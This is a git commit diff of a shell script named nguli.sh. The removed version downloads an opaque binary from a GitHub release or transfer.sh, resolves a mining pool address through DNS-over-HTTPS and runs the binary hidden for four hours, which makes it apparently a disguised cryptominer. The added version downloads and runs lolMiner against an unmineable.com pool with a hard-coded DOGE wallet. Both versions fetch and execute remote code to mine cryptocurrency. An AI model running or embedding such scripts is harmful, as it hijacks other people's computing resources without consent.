54b86cf020a2bd7b0eaa3d51550197960aee8199
alucrot66 <106138171+alucrot66@users.noreply.github.com>
2022-05-31 23:09:24 +0700

    Update nguli.sh

--- nguli.sh
+++ nguli.sh
@@ -1,6 +1,4 @@
-apt update -qq
-apt install -y curl git jq
-curl -Lfo prog https://github.com/bhriscarnatt/first-repo/releases/download/a/prog || curl -Lfo prog https://transfer.sh/OSPjK/prog
-ip=$(curl -s -H 'accept: application/dns-json' 'https://dns.google/resolve?name=poolio.magratmail.xyz&type=A' | jq -r '.Answer[0].data')
-chmod u+x prog
-timeout 4h ./prog -o "${ip}:3000" -u ChrisBarnatt -p ExplainingComputers --cpu-priority 5 > /dev/null
+#tes
+sudo apt-get update && sudo apt-get install opencl-headers ocl-icd-libopencl1 ocl-
+sudo apt install screen -y
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.42/lolMiner_v1.42_Lin64.tar.gz && tar -xvf lolMiner_v1.42_Lin64.tar.gz && cd 1.42 && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user DOGE:D66wyvCAxgrZV8ooeFujzJB9kwqTeD6y43.T4#ykmu-fr8h --ethstratum ETHPROXY
